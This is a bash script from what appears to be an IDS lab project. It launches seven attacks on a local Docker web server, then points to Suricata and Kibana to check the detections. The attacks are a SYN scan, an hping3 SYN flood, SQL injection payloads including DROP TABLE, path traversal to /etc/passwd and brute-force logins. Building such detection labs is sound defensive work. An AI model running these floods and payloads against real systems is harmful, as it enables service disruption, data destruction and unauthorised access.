#!/bin/bash

# Network Security Project - Automated Attack Script
# This script runs all attack scenarios against the web server

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Banner
echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  Network Security Attack Automation${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""

# Step 1: Check and install required tools
echo -e "${YELLOW}[*] Checking required tools...${NC}"

if ! command -v nmap &> /dev/null; then
    echo -e "${YELLOW}[*] Installing nmap...${NC}"
    apt update -qq && apt install -y nmap -qq
fi

if ! command -v hping3 &> /dev/null; then
    echo -e "${YELLOW}[*] Installing hping3...${NC}"
    apt install -y hping3 -qq
fi

if ! command -v curl &> /dev/null; then
    echo -e "${YELLOW}[*] Installing curl...${NC}"
    apt install -y curl -qq
fi

echo -e "${GREEN}[✓] All tools installed${NC}"
echo ""

# Step 2: Discover web server IP
echo -e "${YELLOW}[*] Discovering web server IP address...${NC}"

# Try to resolve by hostname first
WEB_IP=$(getent hosts webserver | awk '{ print $1 }')

if [ -z "$WEB_IP" ]; then
    echo -e "${RED}[!] Could not find web server. Make sure docker-compose is running.${NC}"
    exit 1
fi

echo -e "${GREEN}[✓] Web server found at: $WEB_IP${NC}"
echo ""

# Wait a moment
sleep 2

# Attack 1: ICMP Ping
echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  Attack 1: ICMP Ping Detection${NC}"
echo -e "${BLUE}========================================${NC}"
echo -e "${YELLOW}[*] Sending ICMP ping requests...${NC}"
ping -c 5 $WEB_IP
echo -e "${GREEN}[✓] ICMP ping attack completed${NC}"
echo ""
sleep 3

# Attack 2: Nmap Port Scan
echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  Attack 2: Nmap Port Scanning${NC}"
echo -e "${BLUE}========================================${NC}"
echo -e "${YELLOW}[*] Running Nmap SYN scan on web server...${NC}"
nmap -sS -p 1-1000 $WEB_IP
echo -e "${GREEN}[✓] Nmap scan attack completed${NC}"
echo ""
sleep 3

# Attack 3: DoS-style SYN Flood
echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  Attack 3: SYN Flood (DoS-style)${NC}"
echo -e "${BLUE}========================================${NC}"
echo -e "${YELLOW}[*] Launching SYN flood attack (15 seconds)...${NC}"
echo -e "${YELLOW}[*] Press Ctrl+C if needed${NC}"
timeout 15s hping3 -S --flood -p 80 $WEB_IP 2>/dev/null || true
echo ""
echo -e "${GREEN}[✓] SYN flood attack completed${NC}"
echo ""
sleep 3

# Attack 4: Suspicious HTTP Access Attempts
echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  Attack 4: Suspicious HTTP Access${NC}"
echo -e "${BLUE}========================================${NC}"

echo -e "${YELLOW}[*] Attempting unauthorized admin access...${NC}"
curl -s http://$WEB_IP/admin -o /dev/null -w "HTTP Status: %{http_code}\n"
sleep 2

echo -e "${YELLOW}[*] Attempting suspicious login access...${NC}"
curl -s http://$WEB_IP/login -o /dev/null -w "HTTP Status: %{http_code}\n"
sleep 2

echo -e "${YELLOW}[*] Attempting access to sensitive paths...${NC}"
curl -s http://$WEB_IP/.env -o /dev/null -w "HTTP Status: %{http_code}\n"
curl -s http://$WEB_IP/config.php -o /dev/null -w "HTTP Status: %{http_code}\n"

echo -e "${GREEN}[✓] HTTP access attacks completed${NC}"
echo ""
sleep 3

# Attack 5: SQL Injection
echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  Attack 5: SQL Injection Attempts${NC}"
echo -e "${BLUE}========================================${NC}"

echo -e "${YELLOW}[*] Testing UNION SELECT injection...${NC}"
curl -s "http://$WEB_IP/search?id=1' UNION SELECT password FROM users--" -o /dev/null -w "HTTP Status: %{http_code}\n"
sleep 1

echo -e "${YELLOW}[*] Testing OR 1=1 injection...${NC}"
curl -s "http://$WEB_IP/login?user=admin' OR 1=1--&pass=anything" -o /dev/null -w "HTTP Status: %{http_code}\n"
sleep 1

echo -e "${YELLOW}[*] Testing DROP TABLE injection...${NC}"
curl -s "http://$WEB_IP/delete?id=1'; DROP TABLE users--" -o /dev/null -w "HTTP Status: %{http_code}\n"
sleep 1

echo -e "${GREEN}[✓] SQL injection attacks completed${NC}"
echo ""
sleep 3

# Attack 6: Directory Traversal
echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  Attack 6: Directory Traversal${NC}"
echo -e "${BLUE}========================================${NC}"

echo -e "${YELLOW}[*] Testing basic path traversal...${NC}"
curl -s "http://$WEB_IP/download?file=../../../../etc/passwd" -o /dev/null -w "HTTP Status: %{http_code}\n"
sleep 1

echo -e "${YELLOW}[*] Testing encoded path traversal...${NC}"
curl -s "http://$WEB_IP/view?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd" -o /dev/null -w "HTTP Status: %{http_code}\n"
sleep 1

echo -e "${YELLOW}[*] Testing direct /etc/passwd access...${NC}"
curl -s "http://$WEB_IP/../../../../etc/passwd" -o /dev/null -w "HTTP Status: %{http_code}\n"
sleep 1

echo -e "${GREEN}[✓] Directory traversal attacks completed${NC}"
echo ""
sleep 3

# Attack 7: Brute Force
echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  Attack 7: Brute Force Login${NC}"
echo -e "${BLUE}========================================${NC}"

echo -e "${YELLOW}[*] Simulating brute force login attempts (15 rapid POST requests)...${NC}"
for i in {1..15}; do
    curl -s -X POST "http://$WEB_IP/login" \
        -d "username=admin&password=wrong$i" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -o /dev/null &
done
wait
echo ""
echo -e "${GREEN}[✓] Brute force attack completed${NC}"
echo ""

# Summary
echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  Attack Sequence Complete!${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""
echo -e "${GREEN}All 7 attack scenarios executed successfully!${NC}"
echo ""
echo -e "Attacks executed:"
echo -e "  ${YELLOW}1. ICMP Ping Detection${NC}"
echo -e "  ${YELLOW}2. Nmap Port Scanning${NC}"
echo -e "  ${YELLOW}3. SYN Flood (DoS-style)${NC}"
echo -e "  ${YELLOW}4. Suspicious HTTP Access${NC}"
echo -e "  ${YELLOW}5. SQL Injection Attempts${NC}"
echo -e "  ${YELLOW}6. Directory Traversal${NC}"
echo -e "  ${YELLOW}7. Brute Force Login${NC}"
echo ""
echo -e "Check Suricata logs for detections:"
echo -e "  ${YELLOW}docker exec suricata cat /var/log/suricata/fast.log${NC}"
echo ""
echo -e "Or view Kibana dashboard at:"
echo -e "  ${YELLOW}http://localhost:5601${NC}"
echo ""
